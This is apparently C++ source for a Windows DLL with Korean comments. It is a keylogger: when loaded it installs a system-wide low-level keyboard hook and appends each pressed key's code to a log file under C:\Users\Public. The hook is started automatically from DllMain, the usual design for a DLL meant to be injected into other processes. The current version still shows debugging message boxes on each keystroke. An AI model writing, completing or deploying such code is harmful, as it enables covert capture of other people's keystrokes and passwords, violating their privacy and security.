// test.dll

#include <windows.h>
#include <stdio.h>

#define LOG_PATH L"C:\\Users\\Public\\hook_log.txt"

HHOOK hHook;
HINSTANCE hInst;

// 키보드 이벤트를 가로채는 후킹 함수
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

        // 디버깅 메시지 추가 (키 입력 감지 확인)
        wchar_t buf[50];
        swprintf(buf, 50, L"Key Pressed: %d", kbd->vkCode);
        MessageBox(NULL, buf, L"Key Captured", MB_OK);

        // 디버깅 메시지 추가 (파일 열기 시도 확인)
        MessageBox(NULL, L"Attempting to open log file...", L"Debug", MB_OK);

        FILE *file;
        errno_t err = _wfopen_s(&file, LOG_PATH, L"a+");  // 파일을 "a+" (추가 모드)로 열기
        
        if (err != 0 || !file) {
            MessageBox(NULL, L"Failed to open log file!", L"File Error", MB_OK);
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        MessageBox(NULL, L"Log file opened successfully!", L"Debug", MB_OK);

        // 키 값을 기록
        fwprintf(file, L"Key Pressed: %d\n", kbd->vkCode);
        fclose(file);

        MessageBox(NULL, L"Key logged successfully!", L"Debug", MB_OK);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// 후킹을 시작하는 함수
extern "C" __declspec(dllexport) void StartHook() {
    MessageBox(NULL, L"StartHook Called", L"Debug", MB_OK);  // 후킹 시작 확인

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hInst, 0);
    if (!hHook) {
        wchar_t buf[256];
        swprintf(buf, 256, L"SetWindowsHookEx failed! Error: %d", GetLastError());
        MessageBox(NULL, buf, L"Hook Error", MB_OK);
    } else {
        MessageBox(NULL, L"Hook Installed Successfully!", L"Success", MB_OK);
    }
}

// 후킹을 해제하는 함수
extern "C" __declspec(dllexport) void StopHook() {
    if (hHook) {
        UnhookWindowsHookEx(hHook);
        MessageBox(NULL, L"Hook Removed", L"Debug", MB_OK);
    }
}

// DLL이 로드될 때 실행되는 함수
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            hInst = hModule;
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartHook, NULL, 0, NULL);
            break;
        case DLL_PROCESS_DETACH:
            StopHook();
            break;
    }
    return TRUE;
}
